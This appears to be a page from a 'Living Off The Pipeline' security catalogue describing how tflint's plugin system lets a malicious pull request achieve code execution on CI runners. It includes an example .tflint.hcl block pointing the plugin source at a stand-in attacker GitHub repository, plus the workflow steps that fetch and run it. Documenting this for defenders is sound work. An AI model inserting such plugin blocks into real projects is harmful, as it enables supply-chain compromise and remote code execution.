---
layout: tool
title: tflint
parent: Living Off The Pipeline
nav_order: 27
---

## Living Off The Pipeline - tflint

`tflint` is a popular linter for the Terraform language. Its powerful plugin system can be abused by an attacker to execute arbitrary code, making it a "Living Off The Pipeline" (LOTP) tool.

### First-Order LOTP Tool

`tflint` is a **First-Order LOTP Tool**. It provides direct Remote Code Execution (RCE) by downloading and executing malicious plugins defined in its configuration file.

#### Malicious Primitive: Remote Code Execution (RCE)

The `.tflint.hcl` file is the configuration file for `tflint`. It allows a developer to enable and configure plugins. A plugin is a separate Go binary that `tflint` executes to perform custom rule checks.

The configuration for a plugin includes a `source` attribute, which tells `tflint` where to download the plugin binary from. An attacker can add a new plugin block to the `.tflint.hcl` file in their pull request, pointing the `source` to a malicious repository they control.

When the CI/CD pipeline runs `tflint --init`, it will download the attacker's malicious plugin. The subsequent `tflint` command will then execute this plugin, leading to RCE.

### Second-Order LOTP Attack Chain

1.  **Attacker's PR:** An attacker submits a pull request with a modified `.tflint.hcl` file containing a malicious plugin definition.
    ```hcl
    # .tflint.hcl
    plugin "pwned" {
      enabled = true
      version = "1.0.0"
      source  = "github.com/attacker/tflint-ruleset-pwned"
    }
    ```
    The attacker has published a malicious Go binary as a release asset in their `tflint-ruleset-pwned` repository.

2.  **Vulnerable Workflow:** The pipeline contains a standard set of commands to initialize and run the linter.
    ```yaml
    - name: Run tflint
      run: |
        tflint --init
        tflint
    ```

3.  **Execution:**
    *   The `tflint --init` command is executed.
    *   It reads the `.tflint.hcl` file and finds the attacker's malicious plugin definition.
    *   It downloads the malicious binary from the attacker's GitHub release.
    *   The `tflint` command runs, which in turn executes the downloaded plugin.
    *   The attacker's payload runs, achieving RCE on the CI runner.

This attack is dangerous because the CI/CD workflow file is benign. The malicious payload is downloaded and executed as a result of a seemingly safe configuration change in the linter's setup.

### References

*   [tflint: Managing Plugins](https://github.com/terraform-linters/tflint/blob/master/docs/user-guide/plugins.md)